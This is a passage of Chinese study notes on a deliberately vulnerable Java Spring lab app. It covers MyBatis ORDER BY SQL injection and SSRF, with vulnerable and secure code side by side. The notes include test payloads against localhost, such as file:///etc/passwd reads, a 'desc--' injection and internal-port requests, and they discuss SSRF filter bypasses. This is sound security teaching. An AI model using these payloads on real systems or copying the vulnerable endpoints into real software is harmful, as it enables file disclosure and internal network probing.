public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
    return userMapper.findByUserNameVuln03(sort);
}
```

<img src=".\图片\Snipaste_2023-03-18_14-28-23.png" alt="Snipaste_2023-03-18_14-28-23" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-03-18_14-28-55.png" alt="Snipaste_2023-03-18_14-28-55" style="zoom: 67%;" />

- 执行  `http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=id`  为正序排列，默认 `asc` 正序

<img src=".\图片\Snipaste_2023-03-18_14-32-13.png" alt="Snipaste_2023-03-18_14-32-13" style="zoom:67%;" />

查看 sql 语句情况：

<img src=".\图片\Snipaste_2023-03-18_14-32-29.png" alt="Snipaste_2023-03-18_14-32-29" style="zoom:67%;" />

- 当执行  `http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=id desc--` 时为倒序排列

<img src=".\图片\Snipaste_2023-03-18_14-34-25.png" alt="Snipaste_2023-03-18_14-34-25" style="zoom:67%;" />

查看 sql 语句执行情况

<img src=".\图片\Snipaste_2023-03-18_14-34-42.png" alt="Snipaste_2023-03-18_14-34-42" style="zoom:67%;" />

#### 安全写法

```java
/**
 * <p>Sql injection mybatis security code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/sec01?username=joychou">http://localhost:8080/sqli/mybatis/sec01?username=joychou</a>
 */
@GetMapping("/mybatis/sec01")
public User mybatisSec01(@RequestParam("username") String username) {
    return userMapper.findByUserName(username);
}

/**
 * <p>Sql injection mybatis security code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/sec02?id=1">http://localhost:8080/sqli/mybatis/sec02?id=1</a>
 */
@GetMapping("/mybatis/sec02")
public User mybatisSec02(@RequestParam("id") Integer id) {
    return userMapper.findById(id);
}

/**
 * <p>Sql injection mybatis security code.</p>
 * <a href="http://localhost:8080/sqli/mybatis/sec03">http://localhost:8080/sqli/mybatis/sec03</a>
 */
@GetMapping("/mybatis/sec03")
public User mybatisSec03() {
    return userMapper.OrderByUsername();
}

/**
 * <p>Order by sql injection mybatis security code by using sql filter.</p>
 * <a href="http://localhost:8080/sqli/mybatis/orderby/sec04?sort=id">http://localhost:8080/sqli/mybatis/orderby/sec04?sort=id</a>
 * <p>select * from users order by id asc </p>
 */
@GetMapping("/mybatis/orderby/sec04")
public List<User> mybatisOrderBySec04(@RequestParam("sort") String sort) {
    return userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));
}
```

```java
 @Select("select * from users where username = #{username}")  //使用 #{} 安全写法
    User findByUserName(@Param("username") String username);
```

```xml
<select id="findById" resultMap="User">
        select * from users where id = #{id}   <!-- 使用 #{} 安全写法 -->
    </select>
```

```xml
<select id="OrderByUsername" resultMap="User">
        select * from users order by id asc limit 1   <!-- order by 排序时故意写死，别用 ${} -->
    </select>
```

```java
/**
 * 过滤mybatis中order by不能用#的情况。
 * 严格限制用户输入只能包含<code>a-zA-Z0-9_-.</code>字符。
 *
 * @param sql sql
 * @return 安全sql，否则返回null
 */
public static String sqlFilter(String sql) {
    if (!FILTER_PATTERN.matcher(sql).matches()) {
        return null;
    }
    return sql;
}
```

### SSRF

#### 基础

服务端请求伪造

利用SSRF漏洞能实现的事情有很多，包括但不局限于：扫描内网、向内部任意主机的任意端 口发送精心构造的攻击载荷请求、攻击内网的 Web 应用、读取文件以及拒绝服务攻击等。需要注 意的是，Java 中的 SSRF 利用是有局限性的，在实际场景中，一般利用http/https协议来探测端 口、暴力穷举等，还可以利用file协议读取/下载任意文件。

SSRF 漏洞出现的场景有很多，如在线翻译、转码服务、图片收藏/下载、信息采集、邮件系 统或者从远程服务器请求资源等。通常我们可以通过浏览器查看源代码查找是否在本地进行了请 求，也可以使用 DNSLog 等工具进行测试网页是否被访问。但对于代码审计人员来说，通常可以 从一些 http 请求函数入手，以下是在审计 SSRF 漏洞时需要关注的一些敏感函数。

```
HttpClient.execute()
HttpClient.executeMethod()
HttpURLConnection.connect()
HttpURLConnection.getInputStream()
URL.openStream()
HttpServletRequest()
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```

除以上列举的部分敏感函数外，还有很多需要关注的类，如HttpClient类、URL 类等。根 据实际场景的不同，这些类中的一些方法同样可能存在着 SSRF 漏洞。此外，还有一些封装后的 类同样需要留意，如封装HttpClient后的 Request 类。审计此漏洞时，首先应该确定被审计的源 程序有哪些功能，通常情况下从其他服务器应用获取数据的功能出现的概率较大，确定好功能后 再审计对应功能的源代码能使漏洞挖掘事半功倍。

Java 网络请求支持的协议有很多，包括`http、https、file、ftp、mailto、jar、netdoc`等。 而在实例化利用 SSRF 漏洞进行端口扫描中，HttpURLconnection() 是基于 http 协议的，我们 要利用的是 file 协议，因此也将其删除后即可利用 file 协议去读取任意文件

#### /urlConnection/vuln

主要代码：

```java
/**
 * <p>
 *    The default setting of followRedirects is true. <br>
 *    Protocol: file ftp mailto http https jar netdoc. <br>
 *    UserAgent is Java/1.8.0_102.
 * </p>
 * <a href="http://localhost:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd">http://localhost:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd</a>
 */
@RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
public String URLConnectionVuln(String url) {
    return HttpUtils.URLConnection(url);
}
```

```java
public static String URLConnection(String url) {
    try {
        URL u = new URL(url);
        URLConnection urlConnection = u.openConnection();
        //send request
        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); 
        // BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));
        String inputLine;
        StringBuilder html = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            html.append(inputLine);
        }
        in.close();
        return html.toString();
    } catch (Exception e) {
        logger.error(e.getMessage());
        return e.getMessage();
    }
}
```

file协议，尝试触发  `http://localhost:8080/ssrf/urlConnection/vuln?url=file:///D:/important.txt`

<img src=".\图片\Snipaste_2023-03-18_15-24-57.png" alt="Snipaste_2023-03-18_15-24-57" style="zoom:67%;" />

http协议，尝试触发 `http://localhost:8080/ssrf/urlConnection/vuln?url=http://127.0.0.1:8888`

<img src=".\图片\Snipaste_2023-03-18_15-32-50.png" alt="Snipaste_2023-03-18_15-32-50" style="zoom:67%;" />

#### /urlConnection/sec

安全写法

```java
@GetMapping("/urlConnection/sec")
public String URLConnectionSec(String url) {

    // Decline not http/https protocol
    if (!SecurityUtil.isHttp(url)) {  //先保证 url 是以 http 或 https 协议
        return "[-] SSRF check failed";
    }

    try {
        SecurityUtil.startSSRFHook();  //这里是开启SSRFHook，作者写的东西，我没看懂，好像对Scoket类进行了一些操作
        return HttpUtils.URLConnection(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }
}
```

```java
public static boolean isHttp(String url) {  //先保证 url 是以 http 或 https 协议
    return url.startsWith("http://") || url.startsWith("https://");
}
```

#### /HttpURLConnection/sec

安全写法，关键还是 `SecurityUtil.startSSRFHook(); `这里

```java
/**
 * The default setting of followRedirects is true.
 * UserAgent is Java/1.8.0_102.
 */
@GetMapping("/HttpURLConnection/sec")
public String httpURLConnection(@RequestParam String url) {
    try {
        SecurityUtil.startSSRFHook();
        return HttpUtils.HttpURLConnection(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }
}
```

#### /HttpURLConnection/vuln

不安全写法，重要代码如下：

```java
@GetMapping("/HttpURLConnection/vuln")
    public String httpURLConnectionVuln(@RequestParam String url) {
        return HttpUtils.HttpURLConnection(url);
    }
```

```java
 /**
     * The default setting of followRedirects is true.
     * UserAgent is Java/1.8.0_102.
     */
    public static String HttpURLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (IOException e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
```

测试payload：`http://localhost:8080/ssrf/HttpURLConnection/vuln?url=http://127.0.0.1:8888`

<img src=".\图片\Snipaste_2023-03-18_15-50-09.png" alt="Snipaste_2023-03-18_15-50-09" style="zoom:80%;" />

#### /request/sec

重要代码

```java
/**
 * The default setting of followRedirects is true.
 * UserAgent is <code>Apache-HttpClient/4.5.12 (Java/1.8.0_102)</code>. <br>
 * <a href="http://localhost:8080/ssrf/request/sec?url=http://test.joychou.org">http://localhost:8080/ssrf/request/sec?url=http://test.joychou.org</a>
 */
@GetMapping("/request/sec")
public String request(@RequestParam String url) {
    try {
        SecurityUtil.startSSRFHook();
        return HttpUtils.request(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }
}
```

测试payload： `http://localhost:8080/ssrf/request/sec?url=http://test.joychou.org`

<img src=".\图片\Snipaste_2023-03-18_15-52-44.png" alt="Snipaste_2023-03-18_15-52-44" style="zoom: 80%;" />

当我们测试SSRF，改url为本地时，这里显示被限制了

<img src=".\图片\Snipaste_2023-03-18_15-57-35.png" alt="Snipaste_2023-03-18_15-57-35" style="zoom:80%;" />

#### /openStream

**下载的功能**，重要代码如下：

```java
/**
 * Download the url file. <br>
 * <code>new URL(String url).openConnection()</code>  <br>
 * <code>new URL(String url).openStream()</code> <br>
 * <code>new URL(String url).getContent()</code> <br>
 * <a href="http://localhost:8080/ssrf/openStream?url=file:///etc/passwd">http://localhost:8080/ssrf/openStream?url=file:///etc/passwd</a>

 */
@GetMapping("/openStream")
public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
    InputStream inputStream = null;
    OutputStream outputStream = null;
    try {
        String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
        // download
        response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

        URL u = new URL(url);
        int length;
        byte[] bytes = new byte[1024];
        inputStream = u.openStream(); // send request
        outputStream = response.getOutputStream();
        while ((length = inputStream.read(bytes)) > 0) {
            outputStream.write(bytes, 0, length);
        }

    } catch (Exception e) {
        logger.error(e.toString());
    } finally {
        if (inputStream != null) {
            inputStream.close();
        }
        if (outputStream != null) {
            outputStream.close();
        }
    }
}
```

测试 payload：`http://localhost:8080/ssrf/openStream?url=file:///D:/important.txt`

这里是下载的功能：

<img src=".\图片\Snipaste_2023-03-18_16-02-06.png" alt="Snipaste_2023-03-18_16-02-06" style="zoom:67%;" />

#### /ImageIO/sec

安全写法，重点还是 `SecurityUtil.startSSRFHook();`

```java
/**
 * The default setting of followRedirects is true.
 * UserAgent is Java/1.8.0_102.
 */
@GetMapping("/ImageIO/sec")
public String ImageIO(@RequestParam String url) {
    try {
        SecurityUtil.startSSRFHook();
        HttpUtils.imageIO(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }

    return "ImageIO ssrf test";
}
```

#### 其它

##### class SSRF

```java
package org.joychou.controller;

import ..............
/**
 * Java SSRF vuln or security code.
 *
 * @author JoyChou @2017-12-28
 */

@RestController
@RequestMapping("/ssrf")
public class SSRF {

    private static final Logger logger = LoggerFactory.getLogger(SSRF.class);

    @Resource
    private HttpService httpService;

    /**
     * <p>
     *    The default setting of followRedirects is true. <br>
     *    Protocol: file ftp mailto http https jar netdoc. <br>
     *    UserAgent is Java/1.8.0_102.
     * </p>
     * <a href="http://localhost:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd">http://localhost:8080/ssrf/urlConnection/vuln?url=file:///etc/passwd</a>
     */
    @RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
    public String URLConnectionVuln(String url) {
        return HttpUtils.URLConnection(url);
    }


    @GetMapping("/urlConnection/sec")
    public String URLConnectionSec(String url) {

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) {
            return "[-] SSRF check failed";
        }

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is Java/1.8.0_102.
     */
    @GetMapping("/HttpURLConnection/sec")
    public String httpURLConnection(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.HttpURLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }
    }


    @GetMapping("/HttpURLConnection/vuln")
    public String httpURLConnectionVuln(@RequestParam String url) {
        return HttpUtils.HttpURLConnection(url);
    }

    /**
     * The default setting of followRedirects is true.
     * UserAgent is <code>Apache-HttpClient/4.5.12 (Java/1.8.0_102)</code>. <br>
     * <a href="http://localhost:8080/ssrf/request/sec?url=http://test.joychou.org">http://localhost:8080/ssrf/request/sec?url=http://test.joychou.org</a>
     */
    @GetMapping("/request/sec")
    public String request(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.request(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }
    }


    /**
     * Download the url file. <br>
     * <code>new URL(String url).openConnection()</code>  <br>
     * <code>new URL(String url).openStream()</code> <br>
     * <code>new URL(String url).getContent()</code> <br>
     * <a href="http://localhost:8080/ssrf/openStream?url=file:///etc/passwd">http://localhost:8080/ssrf/openStream?url=file:///etc/passwd</a>

     */
    @GetMapping("/openStream")
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try {
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
            // download
            response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) > 0) {
                outputStream.write(bytes, 0, length);
            }

        } catch (Exception e) {
            logger.error(e.toString());
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            if (outputStream != null) {
                outputStream.close();
            }
        }
    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is Java/1.8.0_102.
     */
    @GetMapping("/ImageIO/sec")
    public String ImageIO(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "ImageIO ssrf test";
    }


    @GetMapping("/okhttp/sec")
    public String okhttp(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

    /**
     * The default setting of followRedirects is true.
     * UserAgent is <code>Apache-HttpClient/4.5.12 (Java/1.8.0_102)</code>. <br>
     * <a href="http://localhost:8080/ssrf/httpclient/sec?url=http://www.baidu.com">http://localhost:8080/ssrf/httpclient/sec?url=http://www.baidu.com</a>
     */
    @GetMapping("/httpclient/sec")
    public String HttpClient(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is <code>Jakarta Commons-HttpClient/3.1</code>.
     * <a href="http://localhost:8080/ssrf/commonsHttpClient/sec?url=http://www.baidu.com">http://localhost:8080/ssrf/commonsHttpClient/sec?url=http://www.baidu.com</a>
     */
    @GetMapping("/commonsHttpClient/sec")
    public String commonsHttpClient(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.commonHttpClient(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

    /**
     * The default setting of followRedirects is true.
     * UserAgent is the useragent of browser.<br>
     * <a href="http://localhost:8080/ssrf/Jsoup?url=http://www.baidu.com">http://localhost:8080/ssrf/Jsoup?url=http://www.baidu.com</a>
     */
    @GetMapping("/Jsoup/sec")
    public String Jsoup(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is <code>Java/1.8.0_102</code>. <br>
     * <a href="http://localhost:8080/ssrf/IOUtils/sec?url=http://www.baidu.com">http://localhost:8080/ssrf/IOUtils/sec?url=http://www.baidu.com</a>
     */
    @GetMapping("/IOUtils/sec")
    public String IOUtils(String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "IOUtils ssrf test";
    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is <code>Apache-HttpAsyncClient/4.1.4 (Java/1.8.0_102)</code>.
     */
    @GetMapping("/HttpSyncClients/vuln")
    public String HttpSyncClients(@RequestParam("url") String url) {
        return HttpUtils.HttpAsyncClients(url);
    }


    /**
     * Only support HTTP protocol. <br>
     * GET HttpMethod follow redirects by default, other HttpMethods do not follow redirects. <br>
     * User-Agent is Java/1.8.0_102. <br>
     * <a href="http://127.0.0.1:8080/ssrf/restTemplate/vuln1?url=http://www.baidu.com">http://127.0.0.1:8080/ssrf/restTemplate/vuln1?url=http://www.baidu.com</a>
     */
    @GetMapping("/restTemplate/vuln1")
    public String RestTemplateUrlBanRedirects(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttpBanRedirects(url, headers);
    }


    @GetMapping("/restTemplate/vuln2")
    public String RestTemplateUrl(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    }


    /**
     * UserAgent is Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool.
     * Do not follow redirects. <br>
     * <a href="http://127.0.0.1:8080/ssrf/hutool/vuln?url=http://www.baidu.com">http://127.0.0.1:8080/ssrf/hutool/vuln?url=http://www.baidu.com</a>
     */
    @GetMapping("/hutool/vuln")
    public String hutoolHttp(String url){
        return HttpUtil.get(url);
    }


    /**
     * DnsRebind SSRF in java by setting ttl is zero. <br>
     * <a href="http://localhost:8080/ssrf/dnsrebind/vuln?url=http://test.joychou.org">http://localhost:8080/ssrf/dnsrebind/vuln?url=dnsrebind_url</a>
     */
    @GetMapping("/dnsrebind/vuln")
    public String DnsRebind(String url) {
        java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
        if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
            return "Dangerous url";
        }
        return HttpUtil.get(url);
    }


}
```

##### class HttpUtils

```java
package org.joychou.util;
import ......

/**
 * @author JoyChou 2020-04-06
 */
public class HttpUtils {

    private final static Logger logger = LoggerFactory.getLogger(HttpUtils.class);

    public static String commonHttpClient(String url) {

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try {
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        } catch (IOException e) {
            return "Error: " + e.getMessage();
        } finally {
            // Release the connection.
            method.releaseConnection();
        }
    }


    public static String request(String url) {
        try {
            return Request.Get(url).execute().returnContent().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }


    public static String httpClient(String url) {

        StringBuilder result = new StringBuilder();

        try {

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }

            return result.toString();

        } catch (Exception e) {
            return e.getMessage();
        }
    }


    public static String URLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            // BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }


    /**
     * The default setting of followRedirects is true.
     * UserAgent is Java/1.8.0_102.
     */
    public static String HttpURLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (IOException e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }


    /**
     * Jsoup is a HTML parser about Java.
     *
     * @param url http request url
     */
    public static String Jsoup(String url) {
        try {
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie("name", "joychou") // request cookies
                    .execute().parse();
            return doc.outerHtml();
        } catch (IOException e) {
            return e.getMessage();
        }
    }


    /**
     * The default setting of followRedirects is true. The option of followRedirects is true.
     *
     * UserAgent is <code>okhttp/2.5.0</code>.
     */
    public static String okhttp(String url) throws IOException {
        OkHttpClient client = new OkHttpClient();
//         client.setFollowRedirects(false);
        com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
        return client.newCall(ok_http).execute().body().string();
    }


    /**
     * The default setting of followRedirects is true.
     *
     * UserAgent is Java/1.8.0_102.
     *
     * @param url http request url
     */
    public static void imageIO(String url) {
        try {
            URL u = new URL(url);
            ImageIO.read(u); // send request
        } catch (IOException e) {
            logger.error(e.getMessage());
        }

    }


    /**
     * IOUtils which is wrapped by URLConnection can get remote pictures.
     * The default setting of redirection is true.
     *
     * @param url http request url
     */
    public static void IOUtils(String url) {
        try {
            IOUtils.toByteArray(URI.create(url));
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
    }


    public static String HttpAsyncClients(String url) {
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try {
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future<HttpResponse> future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            return e.getMessage();
        } finally {
            try {
                httpclient.close();
            } catch (Exception e) {
                logger.error(e.getMessage());
            }
        }
    }
}
```

##### class SocketHook

```java
package org.joychou.security.ssrf;

import java.io.IOException;
import java.net.Socket;
import java.net.SocketException;

/**
 * Socket Hook switch
 *
 * @author liergou @ 2020-04-04 02:12
 */
public class SocketHook {

    public static void startHook() throws IOException {
        SocketHookFactory.initSocket();
        SocketHookFactory.setHook(true);
        try{
            Socket.setSocketImplFactory(new SocketHookFactory());
        }catch (SocketException ignored){
        }
    }

    public static void stopHook(){
        SocketHookFactory.setHook(false);
    }
}
```

##### class SecurityUtil

```java
package org.joychou.security;
import ...........
public class SecurityUtil {

    private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
    private static Logger logger = LoggerFactory.getLogger(SecurityUtil.class);


    /**
     * Determine if the URL starts with HTTP.
     *
     * @param url url
     * @return true or false
     */
    public static boolean isHttp(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }


    /**
     * Get http url host.
     *
     * @param url url
     * @return host
     */
    public static String gethost(String url) {
        try {
            URI uri = new URI(url);
            return uri.getHost().toLowerCase();
        } catch (URISyntaxException e) {
            return "";
        }
    }


    /**
     * 同时支持一级域名和多级域名，相关配置在resources目录下url/url_safe_domain.xml文件。
     * 优先判断黑名单，如果满足黑名单return null。
     *
     * @param url the url need to check
     * @return Safe url returns original url; Illegal url returns null;
     */
    public static String checkURL(String url) {

        if (null == url){
            return null;
        }

        ArrayList<String> safeDomains = WebConfig.getSafeDomains();
        ArrayList<String> blockDomains = WebConfig.getBlockDomains();

        try {
            String host = gethost(url);

            // 必须http/https
            if (!isHttp(url)) {
                return null;
            }

            // 如果满足黑名单返回null
            if (blockDomains.contains(host)){
                return null;
            }
            for(String blockDomain: blockDomains) {
                if(host.endsWith("." + blockDomain)) {
                    return null;
                }
            }

            // 支持多级域名
            if (safeDomains.contains(host)){
                return url;
            }

            // 支持一级域名
            for(String safedomain: safeDomains) {
                if(host.endsWith("." + safedomain)) {
                    return url;
                }
            }
            return null;
        } catch (NullPointerException e) {
            logger.error(e.toString());
            return null;
        }
    }


    /**
     * 通过自定义白名单域名处理SSRF漏洞。如果URL范围收敛，强烈建议使用该方案。
     * 这是最简单也最有效的修复方式。因为SSRF都是发起URL请求时造成，大多数场景是图片场景，一般图片的域名都是CDN或者OSS等，所以限定域名白名单即可完成SSRF漏洞修复。
     *
     * @author JoyChou @ 2020-03-30
     * @param url 需要校验的url
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFByWhitehosts(String url) {
        return SSRFChecker.checkURLFckSSRF(url);
    }


    /**
     * 解析URL的IP，判断IP是否是内网IP。如果有重定向跳转，循环解析重定向跳转的IP。不建议使用该方案。
     *
     * 存在的问题：
     *   1、会主动发起请求，可能会有性能问题
     *   2、设置重定向跳转为第一次302不跳转，第二次302跳转到内网IP 即可绕过该防御方案
     *   3、TTL设置为0会被绕过
     *
     * @param url check的url
     * @return 安全返回true，危险返回false
     */
    @Deprecated
    public static boolean checkSSRF(String url) {
        int checkTimes = 10;
        return SSRFChecker.checkSSRF(url, checkTimes);
    }


    /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     *
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }

    /**
     * Check ssrf by hook socket. Start socket hook.
     *
     * @author liergou @ 2020-04-04 02:15
     */
    public static void startSSRFHook() throws IOException {
        SocketHook.startHook();
    }

    /**
     * Close socket hook.
     *
     * @author liergou @ 2020-04-04 02:15
     **/
    public static void stopSSRFHook(){
        SocketHook.stopHook();
    }



    /**
     * Filter file path to prevent path traversal vulns.
     *
     * @param filepath file path
     * @return illegal file path return null
     */
    public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }


    public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }


    /**
     * 过滤mybatis中order by不能用#的情况。
     * 严格限制用户输入只能包含<code>a-zA-Z0-9_-.</code>字符。
     *
     * @param sql sql
     * @return 安全sql，否则返回null
     */
    public static String sqlFilter(String sql) {
        if (!FILTER_PATTERN.matcher(sql).matches()) {
            return null;
        }
        return sql;
    }

    /**
     * 将非<code>0-9a-zA-Z/-.</code>的字符替换为空
     *
     * @param str 字符串
     * @return 被过滤的字符串
     */
    public static String replaceSpecialStr(String str) {
        StringBuilder sb = new StringBuilder();
        str = str.toLowerCase();
        for(int i = 0; i < str.length(); i++) {
            char ch = str.charAt(i);
            // 如果是0-9
            if (ch >= 48 && ch <= 57 ){
                sb.append(ch);
            }
            // 如果是a-z
            else if(ch >= 97 && ch <= 122) {
                sb.append(ch);
            }
            else if(ch == '/' || ch == '.' || ch == '-'){
                sb.append(ch);
            }
        }

        return sb.toString();
    }

    public static void main(String[] args) {
    }

}
```

##### class SSRFChecker

```java
package org.joychou.security.ssrf;
import ...............

public class SSRFChecker {

    private static final Logger logger = LoggerFactory.getLogger(SSRFChecker.class);
    private static String decimalIp;

    public static boolean checkURLFckSSRF(String url) {
        if (null == url) {
            return false;
        }

        ArrayList<String> ssrfSafeDomains = WebConfig.getSsrfSafeDomains();
        try {
            String host = SecurityUtil.gethost(url);

            // 必须http/https
            if (!SecurityUtil.isHttp(url)) {
                return false;
            }

            if (ssrfSafeDomains.contains(host)) {
                return true;
            }
            for (String ssrfSafeDomain : ssrfSafeDomains) {
                if (host.endsWith("." + ssrfSafeDomain)) {
                    return true;
                }
            }
        } catch (Exception e) {
            logger.error(e.toString());
            return false;
        }
        return false;
    }

    /**
     * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。
